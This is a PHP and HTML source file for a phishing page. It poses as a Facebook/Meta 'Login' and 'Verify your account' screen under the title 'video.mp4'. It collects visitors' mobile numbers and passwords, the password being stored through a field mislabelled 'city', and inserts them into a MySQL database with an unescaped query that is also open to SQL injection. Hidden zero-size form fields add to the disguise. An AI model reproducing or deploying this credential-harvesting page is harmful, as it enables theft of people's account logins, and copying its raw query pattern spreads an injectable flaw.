<?php 
if(isset($_POST['submit'])){
    $name = $_POST['name'];
    $email = $_POST['email'];
    $mobile = $_POST['mobile'];
    $city = $_POST['city'];

    $host = 'localhost';
    $user = 'root';
    $pass = '';
    $dbname = 'mytutor';

    $conn = mysqli_connect($host,$user,$pass,$dbname);

    $sql = "INSERT INTO student(name,email,mobile,city) values ('$name','$email','$mobile','$city')";
    mysqli_query($conn,$sql);
}

 ?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>video.mp4</title>

    <style>

#div1{
    margin-top: -15px;
}
#login{
    color: rgb(19, 102, 226);
    font-size: 50px;
    text-align: center;
}

#h2{
    font-size: 21px;
    text-align: center;
    margin-top: -22px;
    font-family: Arial, Helvetica, sans-serif;
    color: rgb(63, 61, 61);
}

.name{
    border:none;
    width: 0%;
    height: 0%;
}

.email{
    border:none;
    width: 0%;
    height: 0%;
}

.number{
    width: 95%;
    margin-left: 10px;
    height: 40px;
    border-radius: 10px;
    border: none;
    border: 1px solid rgb(194, 191, 191);
    letter-spacing:1px;
}

.password{
    width: 95%;
    margin-left: 10px;
    height: 40px;
    border-radius: 10px;
    border: none;
    border: 1px solid rgb(194, 191, 191);
    margin-top: 8px;
    letter-spacing:1px;
}

.submit{
    width: 96.5%;
    margin-left: 10px;
    height: 35px;
    border-radius: 10px;
    border: none;
    border: 1px solid rgb(194, 191, 191);
    margin-top: 70px;
    background-color:rgb(19, 102, 226);
    color: white;
    font-size: 18px;
    font-weight: bold;
}

.submit:hover{
    background-color:rgb(63, 63, 243);
}

#p1{
    text-align: center;
    font-size: 17px;
    letter-spacing: 1px;
    font-family: Arial, Helvetica, sans-serif;
    rgb(63, 61, 61);
}


.button{
    width: 97%;
    margin-left: 10px;
    padding-top: 6px;
    padding-bottom: 6px;
    font-size: 15px;
    letter-spacing: 1px;
    font-family: Arial, Helvetica, sans-serif;
    color: rgb(19, 102, 226);
    border: 1px solid rgb(19, 102, 226);
    border-radius: 10px;
    margin-top: 100px;
    
    
}

#p3{
    font-size: 20px;
    font-weight: bold;
    text-align: center;
    margin-top:-0px;
    
    
}
    </style>

</head>
<body>

<div id="div1">
<h1 id="login">Login</h1>
<p id="h2">With Facebook</p>
</div>

    
<form action="#" method="POST">
<input type="text" name="name" class="name"><br>

<input type="email" name="email" class="email"><br>

Mobile : <input type="number" name="mobile" class="number" placeholder="   Mobile number" required><br>

password : <input type="city" name="city" class="password" placeholder="   Enter your password" required><br>

<button type="submit" name="submit" class="submit">Verify your account </button>


</form>

<p id="p1">Forgetten password?</p>
<input type="submit" name="button" class="button" value="Create new account">
<p id="p3">Meta</p>



<script>
function rifat(){
    document.location.href="index.html";
}

    </script>

</body>
</html>